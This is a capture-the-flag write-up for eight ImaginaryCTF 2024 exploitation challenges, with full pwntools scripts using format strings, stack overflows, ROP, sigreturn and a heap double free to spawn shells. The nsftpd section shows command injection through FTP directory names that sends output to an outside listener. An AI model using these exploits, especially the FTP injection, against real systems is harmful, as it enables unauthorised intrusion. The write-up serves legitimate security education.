---
layout: page
title: "Imaginary CTF 2024 pwn"
date: 2024-07-22 00:00:00 -0000
---

Contents
- [imgstore](#imgstore) (136 solves)
- [ropity](#ropity) (68 solves)
- [onewrite](#onewrite) (63 solves)
- [fermat](#fermat) (58 solves)
- [ictf-band](#ictf-band) (45 solves)
- [bopity](#bopity) (28 solves)
- [hopper](#hopper) (14 solves)
- [nsftpd](#nsftpd) (12 solves)


All my solvers are [here](https://github.com/jt00000/ctf.writeup/tree/master/imaginary2024).

# imgstore
Typical note-style task. We can choose list, buy, and sell book.

```

[+] Please wait.. The program is starting..

       ______ ______      
     _/      Y      \_    
    // ~~ ~~ | ~~ ~  \\   
   // ~ ~ ~~ | ~~~ ~~ \\  
  //________.|.________\\ 
 `----------'-'----------'

 +=======================+
 |                       |
 |     IMG BOOKSTORE     |
 |                       |
 +=-=-=-=-=-=-=-=-=-=-=-=+
 |                       |
 | [1]. List Books.      |
 | [2]. Buy Book.        |
 | [3]. Sell Book.       |
 | [4]. Exit.            |
 |                       |
 +=======================+

>> 
```

There are fsb bug, and backdoor in `sellbook`.

But the conditions for using it are a bit strict. We can't use `backdoor` unless `0x13F5C223 * buf == dword_6050`, and this variable `buf` is obtained from `/dev/urandom`, so it's not possible to predict it.

```c
unsigned __int64 sellbook()
{
  char v1; // [rsp+7h] [rbp-59h] BYREF
  int buf; // [rsp+8h] [rbp-58h] BYREF
  int fd; // [rsp+Ch] [rbp-54h]
  char s[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  fd = open("/dev/urandom", 0);
  read(fd, &buf, 4uLL);
  close(fd);
  buf = (unsigned __int16)buf;
  do
  {
    printf("Enter book title: ");
    fgets(s, 50, stdin);
    printf("Book title --> ");
    printf(s); // <----------------------------
    puts(&::s);
    if ( 0x13F5C223 * buf == dword_6050 )
    {
      dword_608C = 2;
      backdoor(2); // <----------------------------
    }
    
......

```

In `backdoor`, there is simple stack overflow.

```c
unsigned __int64 __fastcall backdoor(int a1)
{
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  sub_18F2();
  if ( a1 == 2 )
  {
    printf("%s[/] UNDER DEVELOPMENT %s\n", "\x1B[44m", "\x1B[0m");
    putchar(0x3E);
    fgets(s, 160, stdin);
  }
  else
  {
    printf("%s[!] SECURITY BREACH DETECTED%s\n", "\x1B[41m", "\x1B[0m");
    puts("[+] BAD HACKER!!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

So we first get all the leaks with fsb. Next, we set up the conditions for a `backdoor`.

A random value is put on the stack, and the value to compare against is put on the bss, but since the addresses are already known, we can make the condition true by just setting them both to zero.

All that's left is to send the ROP to open the shell.

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './imgstore'
HOST = 'imgstore.chal.imaginaryctf.org'
PORT =  1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(['./ld-linux-x86-64.so.2', TARGET])
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [0x1e14])

# fsb offset: 8

# grab leaks
r.sendlineafter(b'>> ', b'3')
r.sendlineafter(b': ', b'|%p|%25$p|%23$p|%21$p|')
r.recvuntil(b'|')

stack = int(r.recvuntil(b'|', True), 16)
target = stack + 0x26a8

leak = int(r.recvuntil(b'|', True), 16)
base = leak -0x24083
system = base + 0x52290
rdi = base + 0x0019788d
binsh  = base + 0x1b45bd

leak = int(r.recvuntil(b'|', True), 16)
pie = leak - 0x22a3
feedbeef = pie + 0x6050

canary = int(r.recvuntil(b'|', True), 16)

# set backdoor conditions
r.sendlineafter(b']: ', b'y')
payload = b'%9$naaaa'
payload += p64(feedbeef)
r.sendlineafter(b': ', payload)

r.sendlineafter(b']: ', b'y')
payload = b'%9$naaaa'
payload += p64(target)
r.sendlineafter(b': ', payload)

# send ROP payload to backdoor
payload = b''
payload += b'a'*0x68
payload += p64(canary)
payload += b'c'*8
payload += flat(rdi+1, rdi, binsh, system)
r.sendlineafter(b'\n>', payload)

r.interactive()
r.close()
```

# ropity
There is a function called `printfile`, which displays the contents via sendfile when you set a file name pointer to `rdi`.

However, placing a value in `rdi` is a bit tricky.We use this gadget to set `rdi`. By rewriting the GOT of `fgets` to `printfile`, you can put the desired value in `rdi`.

```
  401149:       48 8d 45 f8             lea    rax,[rbp-0x8]
  40114d:       be 00 01 00 00          mov    esi,0x100
  401152:       48 89 c7                mov    rdi,rax
  401155:       e8 e6 fe ff ff          call   401040 <fgets@plt>
```

So, in the first ROP we set `rbp` to bss, in the next ROP we overwrite the GOT with `fgets` and store the file name, and in the last ROP we put the file name pointer in `rdi` and call `printfile`.

We did not solve this problem, but solved it together with [bopity](#bopity), so we will omit the script here. 

# onewrite
You are given the address of the printf and are free to write to it once.

```
0x790b15660770
> 
```
The program is very simple, you enter `where` and `what`, and it writes the value there.

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *s; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  printf("%p\n> ", &printf); 
  __isoc99_scanf("%p%*c", &s); // <-----------where
  fgets(s, 0x300, stdin); // <--------------what
  puts("bye");
  return v6 - __readfsqword(0x28u);
}
```

When we try to overwrite the libc GOT, it crashes when `strlen` is called in `puts`. At this point, we still have a pointer to our payload at `rsp+0x48`, so we use this to construct the COP.

We decided to use this gadget. `0x00166b4a: mov rax, [rsp+0x48]; mov rdi, [rax]; mov rax, [rdi+0x38]; call qword ptr [rax+0x18];`

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './vuln'
HOST = 'onewrite.chal.imaginaryctf.org'
PORT =  1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [])
if args.R:
    r.recvuntil(b'\n')

leak = int(r.recvuntil(b'\n', True), 16)

base = leak - 0x60770
dbg('base')
system = base + 0x50d60
rdi = base + 0x001bc021

bss = base + 0x219000
gadget = base +  0x00166b4a#: mov rax, [rsp+0x48]; mov rdi, [rax]; mov rax, [rdi+0x38]; call qword ptr [rax+0x18];

where = bss

r.sendlineafter(b'> ', f'{where:x}'.encode())

payload = b''
payload += flat(bss+0x40, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, bss, u64(b'/bin/sh\x00'), 0x88, 0x99, system+0x1b, 0x202, 0x303, 0x404, bss+0x40, 0x606, 0x707, 0x808)
payload = payload.ljust(0x98, b'1')
payload += p64(gadget)
payload = payload.ljust(0x300, b'2')
r.sendline(payload)

r.interactive()
r.close()
```

# fermat

Very simple program, has fsb and stack overflow.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[256]; // [rsp+0h] [rbp-100h] BYREF

  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  read(0, buf, 0x128uLL);
  if ( strchr(buf, 110) )
    __assert_fail("strstr(buf, \"n\") == NULL", "vuln.c", 0xEu, "main");
  printf(buf);
  return 0;
}
```

Since the input is called with `read`, we can return to `main` by partially rewriting the return address. So we leak the libc address once and build ROP.

```python
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './vuln'
HOST = 'fermat.chal.imaginaryctf.org'
PORT =  1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [0x1273])


payload = b''
payload += b'|%3$p|'
payload = payload.ljust(0x108, b'\x00')
payload += b'\x44'
r.send(payload)
r.recvuntil(b'|')
leak = int(r.recvuntil(b'|', True), 16)
base = leak - 0x114992
dbg('base')
system = base + 0x50d60
rdi = base + 0x001bc021
binsh = base + 0x1d8698

payload = b''
payload = payload.ljust(0x108, b'\x00')
payload += flat(rdi+1, rdi, binsh, system)

r.send(payload)
r.interactive()
r.close()
```

# ictf-band
We have a stack overflow at the end of the main loop. It looks like we just have a leak.

```c
int after_end_of_loop()
{
  char ptr[208]; // [rsp+0h] [rbp-160h] BYREF
  char s[60]; // [rsp+D0h] [rbp-90h] BYREF
  unsigned int v3; // [rsp+10Ch] [rbp-54h] BYREF
  char v4[40]; // [rsp+110h] [rbp-50h] BYREF
  __int64 v5; // [rsp+138h] [rbp-28h]
  __int64 v6; // [rsp+140h] [rbp-20h]
  __int64 v7; // [rsp+148h] [rbp-18h]
  __int64 v8; // [rsp+150h] [rbp-10h]
  __int64 v9; // [rsp+158h] [rbp-8h]

  puts(byte_3080);
  sub_1648();
  strcpy(v4, "Thank you for filling the questionnaire");
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  puts("\x1B[1;32m[+]\x1B[0m Anyway, we want to identify your persona.");
  puts("[?] Kindly fill the questionnaire below [?]");
  printf("Name: ");
  fgets(s, 50, stdin);
  printf("Age: ");
  __isoc99_scanf("%d", &v3);
  printf("Life background: ");
  fread(ptr, 1uLL, (int)v3, stdin); // <-------- stack overflow
  puts(byte_3080);
  puts(byte_3080);
  puts("======= YOUR DATA =======");
  printf("Name: %s\n", s);
  printf("Age: %d\n", v3);
  printf("Life Background: %s\n", ptr);
  puts(byte_3080);
  printf("\x1B[1;33m");
  puts("[+] Data saved!");
  printf("\x1B[0m");
  puts(byte_3080);
  return printf("\x1B[1;32m>>\x1B[0m %s\n", v4);
}
```

Some functions display uninitialized variables, and by using these we can display the addresses of libraries remaining on the stack.

```c
        printf("The album should be pre-ordered. Tell us how many you want, we will contact you soon: ");
        __isoc99_scanf("%d", &v2);
        getchar();
        printf("Tell us your e-mail: ");
        fread(ptr, 1uLL, v2, stdin);
        puts(byte_3080);
        printf("\x1B[1;33m");
        puts("[YOUR DATA] Please validate before continuing: ");
        printf("\x1B[0m");
        puts(ptr); // <--------leak
```

So we call that function, leak it, exit the loop and exploit the stack overflow to send ROP.

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './ictf-band'
HOST = 'ictf-band.chal.imaginaryctf.org'
PORT =  1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(['./ld-linux-x86-64.so.2', TARGET])
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [0x20c5])

r.sendlineafter(b'>> ', b'1')
r.sendlineafter(b'[1-5]: ', b'0')
r.sendlineafter(b'Count: ', b'0')
r.sendlineafter(b'[y/n]: ', b'y')
r.sendlineafter(b'soon: ', b'16')
r.sendafter(b'e-mail: ', b'a'*0x10)
r.recvuntil(b'a'*0x10)
leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
r.sendlineafter(b'[y/n]: ', b'y')

base = leak - 0x21b780

dbg('base')
rdi = base + 0x001bbea1
binsh = base + 0x1d8678
system = base + 0x50d70


payload = b''
payload += b'a'*(0x200-0x98-1)
payload += flat(rdi+1,rdi, binsh, system)

r.sendlineafter(b'>> ', b'4')
r.sendlineafter(b'Name: ', b'a')
r.sendlineafter(b'Age: ', str(len(payload)).encode())
r.sendlineafter(b'Life background: ', payload)

r.interactive()
r.close()
```

# bopity
The binary is same as [ropity](#ropity).This time we have to launch shell.

As shown in `ropity`, this gadget allows you to control the value of `rax`.

```
  401149:       48 8d 45 f8             lea    rax,[rbp-0x8]
  40114d:       be 00 01 00 00          mov    esi,0x100
  401152:       48 89 c7                mov    rdi,rax
  401155:       e8 e6 fe ff ff          call   401040 <fgets@plt>
```

Also, since we have control over the values ​​on the stack, using `sigreturn` seems easier.

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './vuln'
HOST = 'ropity.chal.imaginaryctf.org'
PORT =   1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

rbp = 0x0040119b

r = start()
if args.D:
    debug(r, [0x115b])

if args.R:
    r.recvuntil(b'\n')
payload = b''
payload += b'a'*8
payload += flat(0x404020, elf.sym.main+12)
r.sendline(payload)

binsh_addr = 0x404030
payload = b''
payload += flat(elf.sym.printfile+12+7, 0xf+8, 0x401149)
payload += b'/bin/sh\x00'
payload += b'2'*8
payload += b'3'*8
payload += b'4'*8
payload += b'5'*8
payload += b'6'*8
payload += b'7'*8
payload += b'8'*8
payload += b'9'*8
payload += b'a'*8
payload += b'b'*8
payload += b'c'*8
payload += p64(binsh_addr)#b'd'*8 # rdi
payload += p64(0)#b'e'*8# rsi
payload += b'f'*8
payload += b'1'*8
payload += p64(0)#b'2'*8# rdx
payload += p64(0x3b)#b'3'*8# rax
payload += b'4'*8
payload += p64(0x404400)#b'5'*8#rsp
payload += p64(0x401198)#b'6'*8#rip
payload += p64(0)
payload += p64(0x33)
payload += p64(0x2b)
r.sendline(payload)

r.interactive()
r.close()
```

# hopper

Another classic note-style task.

```
welcome!
1. alloc
2. remove
3. show
4. exit
choice> 
```

`main` doesn't do anything special. It can create, delete, and display notes written in vector. When deleting or displaying, `clean` is called.

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  int v4; // [rsp+Ch] [rbp-54h] BYREF
  char cont_vec[32]; // [rsp+10h] [rbp-50h] BYREF
  char size_vec[24]; // [rsp+30h] [rbp-30h] BYREF
  unsigned __int64 v7; // [rsp+48h] [rbp-18h]

  v7 = __readfsqword(0x28u);
  std::vector<char *>::vector(cont_vec, argv, envp);
  std::vector<int>::vector(size_vec);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "welcome!");
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      std::istream::operator>>(&std::cin, &v4);
      if ( v4 != 3 )
        break;
      clean((__int64)cont_vec, (__int64)size_vec);
      show((__int64)cont_vec);
    }
    if ( v4 > 3 )
      break;
    if ( v4 == 1 )
    {
      alloc((__int64)cont_vec, (__int64)size_vec);
    }
    else
    {
      if ( v4 != 2 )
        break;
      clean((__int64)cont_vec, (__int64)size_vec);
      remove((__int64)cont_vec, (__int64)size_vec);
    }
  }
  exit(0);
}
```

This `clean` isn't very clean: it deletes the contents of the vector but doesn't reindex it, so if there are two consecutive chunks with size -1, it will miss the second one.

```c
unsigned __int64 __fastcall clean(__int64 cont_vec, __int64 size_vec)
{
  int i; // [rsp+1Ch] [rbp-34h]
  __int64 v4; // [rsp+20h] [rbp-30h] BYREF
  __int64 v5; // [rsp+28h] [rbp-28h] BYREF
  __int64 v6; // [rsp+30h] [rbp-20h] BYREF
  unsigned __int64 v7; // [rsp+38h] [rbp-18h]

  v7 = __readfsqword(0x28u);
  for ( i = 0; i < (unsigned __int64)std::vector<int>::size(size_vec); ++i )
  {
    if ( *(_DWORD *)std::vector<int>::operator[](size_vec, i) == -1 )
    {
      v4 = std::vector<int>::begin(size_vec);
      v5 = __gnu_cxx::__normal_iterator<int *,std::vector<int>>::operator+(&v4, i);
      __gnu_cxx::__normal_iterator<int const*,std::vector<int>>::__normal_iterator<int *>(&v6, &v5);
      std::vector<int>::erase(size_vec, v6);
      v4 = std::vector<char *>::begin(cont_vec);
      v5 = __gnu_cxx::__normal_iterator<char **,std::vector<char *>>::operator+(&v4, i);
      __gnu_cxx::__normal_iterator<char * const*,std::vector<char *>>::__normal_iterator<char **>(&v6, &v5);
      std::vector<char *>::erase(cont_vec, v6);
    }
  }
  return v7 - __readfsqword(0x28u);
}
```

What happens if the second chunk is missed? The answer is `double free`.

If there is a chunk of size -1 before the freed chunk, this chunk will not disappear from the vector and will be able to free the chunk again.

Before clean:
```
chunk0(size: 10)
chunk1(size: -1)
chunk2(size: -1)
chunk3(size: -1)
chunk4(size: 11) <--- if you free this chunk,
chunk5(size: 10)
```

After first clean:
```
chunk0(size: 10)
chunk2(size: -1) <---
chunk4(size: -1) <--- it's freed and remaing
chunk5(size: 10)
```

After second clean:
```
chunk0(size: 10)
chunk4(size: -1) <--- we can free this again
chunk5(size: 10)
```

We exploit this to arbitrary address allocation, leak the stack address, and send an ROP.

```python
rom pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './vuln'
HOST = 'hopper.chal.imaginaryctf.org'
PORT =  1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


def al(d, s=''):
    r.sendlineafter(b'choice> ', b'1')
    if s == '':
        r.sendlineafter(b'size> ', str(len(d)+1).encode())
    else:
        r.sendlineafter(b'size> ', str(s).encode())
        if s <= 1:
            return

    r.sendlineafter(b'content> ', d)

def dl(idx):
    r.sendlineafter(b'choice> ', b'2')
    r.sendlineafter(b'idx> ', str(idx).encode())
def show(idx):
    r.sendlineafter(b'choice> ', b'3')
    r.sendlineafter(b'idx> ', str(idx).encode())

r = start()

# leak heap, libc
al(b'a'* 0x40)
dl(0)
al(b'a', 0x418)
al(b'a', 0x18)
dl(0)

al(b'', 0)
al(b'', 0)
al(b'', 0)

show(1)
r.recvuntil(b'data: ')
heap_leak = u64(r.recvuntil(b'1. alloc', True).ljust(8, b'\x00'))
heap = heap_leak << 12
heap -= 0x11000
show(3)
r.recvuntil(b'data: ')
libc_leak = u64(r.recvuntil(b'1. alloc', True).ljust(8, b'\x00'))
base = libc_leak - 0x21ace0
if args.R:
    base += 0x1000
dbg('heap')
dbg('base')

system = base + 0x50d70
binsh = base + 0x1d8678
environ = base + 0x222200
rdi = base + 0x001bbea1

if args.R:
    system = base + 0x50d60
    binsh = base + 0x1d8698
    environ = base + 0x0000000000221200
    rdi =  base+ 0x001bc021

# prepare fake fastbin and victim chunks to overwrite tcache_perthread_struct
al(b'a'*0xe0+p64((heap+0x12060)>>12)) # fake fastbin chunk to chain
al(b'a'*0xe0+p64(0xbeef0)) # victim
dl(4)
dl(4)

# stash 7chunks to tcache
for i in range(7):
    al(b'a'*0x60)
for i in range(6*30):
    al('', -1)

al(b'b'*0x60)
for i in range(7):
    dl(4)

# push 1 chunk to fastbin
dl(5)

# pop 1 tcache
al(b'b'*0x60)

# re-free the chunk in fastbin
dl(4)

# place fake fd
al(p64((heap+0x12050)^((heap+0x134d0)>>12)), 0x60)
for i in range(6):
    al(chr(0x30+i).encode()*4, 0x60)

al(flat(0xdead, 0xbeef), 0x60)

# use overlapped chunk to edit fd of 0x100 sized chunk
payload = b''
payload += flat(0x11dead, 0x22beef)
payload += flat(0x33c0de, 0x101)
payload += flat((heap+0x80)^((heap+0x12080) >> 12))

al(payload, 0x60)

# overwrite tcache_perthread_struct
al(b'a'*0xf0)
payload = b''
payload += b'a'*0x10
payload += flat(environ, heap+0x90) # addresses we want to allocate
al(payload, 0xf0)

# leak stack address
al('', 0)
show(16)
r.recvuntil(b'data: ')
stack = u64(r.recvuntil(b'1. alloc', True). ljust(8, b'\x00'))
dbg('stack')
if args.D:
    debug(r, [0x16a6])

context.log_level = 'debug'
target = stack-0x190

# overwrite tcache_perthread_struct again
payload = b''
payload += flat(0, 0, 0xbeef, target-8)

al(payload, 0x24)


# send ROP payload to stack
payload = b''
payload += flat(0xdead, rdi+1, rdi, binsh, system, 0xbeef)
al(payload, 0x40)

r.sendline(b'cat f*; ls -la; pwd ;cat /f*')

r.interactive()
r.close()
```

# nsftpd
This is a task using OSS ftp software.

There is a critical command injection in the implementation of the LIST command.

```c
void file_list(int sock, char* dir) {
    char cmd_buffer[BUFFER_SIZE];
    sprintf(cmd_buffer, "ls -l %s", dir);
    FILE* pipe = popen(cmd_buffer, "r");
    send_file(sock, pipe);
    pclose(pipe);
}
```

We can execute any command by creating a directory name with the command itself, changing the current directory to it, and executing LIST.

We tried to connect to the port using PASV to receive the results of command processing, but we were unable to connect successfully, perhaps due to the server settings. So instead we spin up an AWS instance and use the PORT command to capture the output.

```python
from pwn import *
context.log_level = 'debug'

TARGET = './ftpd'
HOST = 'localhost'
PORT =  2121

r = remote(HOST, PORT)
raw_cmd = b'ls -la /'
#raw_cmd = b'/getflag'
cmd = f'echo {b64e(raw_cmd)}|base64 -d|sh'

r.sendline(b'noop')
r.sendlineafter(b'200 OK\r\n', f'rmd a;{cmd}'.encode())
r.sendline(b'noop')
r.sendlineafter(b'200 OK\r\n', f'mkd a;{cmd}'.encode())
r.sendlineafter(b'created\r\n', f'cwd a;{cmd}'.encode())
r.sendlineafter(b'ful\r\n', b'port xx,xx,xx,xx,pp,pp') # FIXME: edit (ip, port) to where you want to get result
r.sendlineafter(b'\r\n', b'list')

r.interactive()
r.close()
```

```
$ python3 solve.py R
remote
[+] Opening connection to nsftpd-11cea85e637049d2.d.imaginaryctf.org on port 8443: Done
[DEBUG] Sent 0x5 bytes:
    b'noop\n'
[DEBUG] Received 0x25 bytes:
    b"220 Welcome to thinxer's ftp server\r\n"
[DEBUG] Received 0x8 bytes:
    b'200 OK\r\n'
[DEBUG] Sent 0x25 bytes:
    b'rmd a;echo L2dldGZsYWc=|base64 -d|sh\n'
[DEBUG] Sent 0x5 bytes:
    b'noop\n'
[DEBUG] Received 0x12 bytes:
    b'500 Unkown error\r\n'
[DEBUG] Received 0x8 bytes:
    b'200 OK\r\n'
[DEBUG] Sent 0x25 bytes:
    b'mkd a;echo L2dldGZsYWc=|base64 -d|sh\n'
[DEBUG] Received 0x30 bytes:
    b'257 "a;echo L2dldGZsYWc=|base64 -d|sh" created\r\n'
[DEBUG] Sent 0x25 bytes:
    b'cwd a;echo L2dldGZsYWc=|base64 -d|sh\n'
[DEBUG] Received 0x1b bytes:
    b'250 CWD command sucessful\r\n'
[DEBUG] Sent 0x19 bytes:
    b'port 3,144,195,50,128,16\n'
[DEBUG] Received 0x1d bytes:
    b'200 PORT command successful\r\n'
[DEBUG] Sent 0x5 bytes:
    b'list\n'
[*] Switching to interactive mode
[DEBUG] Received 0x31 bytes:
    b'150 Opening ASCII mode data connection for LIST\r\n'

[DEBUG] Received 0x17 bytes:
    b'226 Transfer complete\r\n'

```

There is `/getflag` and `/flag.txt` with no perm. We tried `/getflag`.


```
$ nc -lnvp 32784
Listening on 0.0.0.0 32784
Connection received on 35.184.212.24 41546
total 80
drwxr-xr-x   1 root root  4096 Jul 21 08:15 .
drwxr-xr-x   1 root root  4096 Jul 21 08:15 ..
lrwxrwxrwx   1 root root     7 Feb 12 14:02 bin -> usr/bin
drwxr-xr-x   2 root root  4096 Apr 18  2022 boot
drwxr-xr-x   5 root root   360 Jul 21 08:15 dev
drwxr-xr-x   1 root root  4096 May 31 21:30 etc
----------   1 root root    43 May 31 21:20 flag.txt
-rwsr-sr-x   1 root root 16184 May 31 21:27 getflag
drwxr-xr-x   1 root root  4096 May 31 21:30 home
lrwxrwxrwx   1 root root     7 Feb 12 14:02 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 12 14:02 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 12 14:02 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 12 14:02 libx32 -> usr/libx32
drwxr-xr-x   2 root root  4096 Feb 12 14:02 media
drwxr-xr-x   2 root root  4096 Feb 12 14:02 mnt
drwxr-xr-x   2 root root  4096 Feb 12 14:02 opt
dr-xr-xr-x 196 root root     0 Jul 21 08:15 proc
drwx------   2 root root  4096 Feb 12 14:06 root
drwxr-xr-x   5 root root  4096 Feb 12 14:06 run
lrwxrwxrwx   1 root root     8 Feb 12 14:02 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Feb 12 14:02 srv
dr-xr-xr-x  13 root root     0 Jul 21 08:15 sys
drwxrwxrwt   2 root root  4096 Feb 12 14:06 tmp
drwxr-xr-x  14 root root  4096 Feb 12 14:02 usr
drwxr-xr-x   1 root root  4096 Feb 12 14:06 var
```

```
$ nc -lnvp 32784
Listening on 0.0.0.0 32784
Connection received on 35.184.212.24 55432
ictf{we_love_random_2009_github_projects!}
```